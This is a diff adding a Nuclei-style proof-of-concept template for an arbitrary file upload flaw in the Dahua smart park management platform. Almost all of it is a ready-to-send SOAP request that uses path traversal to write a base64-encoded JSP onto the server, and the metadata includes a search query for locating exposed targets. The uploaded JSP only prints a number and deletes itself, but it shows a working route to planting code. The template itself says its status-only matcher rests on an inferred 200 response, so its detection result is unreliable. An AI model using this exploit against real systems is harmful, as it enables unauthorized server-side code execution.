@@ -1,0 +1,21 @@
+id: poc-7051ecb01e41928cec84
+info:
+  name: 大华智慧园区综合管理平台bitmap任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/7051ecb01e41928cec84dab31c886bf2
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 7051ecb01e41928cec84dab31c886bf2
+    fofa: + hunter:`app.name="Dahua 大华 智慧园区管理平台"`
+http:
+- raw:
+  - "POST /emap/webservice/gis/soap/bitmap HTTP/1.1\nCookie: JSESSIONID=C30EF0C843ACBDC71597DEE0CBDADE8C\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\nTe: trailers\nConnection: close\nSOAPAction:\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 628\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <res:uploadPicFile>\n         <arg0>\n <picName>stc.jsp</picName>\n\n                    <!--type: string-->\n                    <picPath>/../stc.jsp</picPath>\n\n         </arg0>\n\n         <!--type: base64Binary-->\n         <arg1>PCVvdXQucHJpbnQoOTk5Kjk5OSk7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==</arg1>\n\n      </res:uploadPicFile>\n\n   </soapenv:Body>\n\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
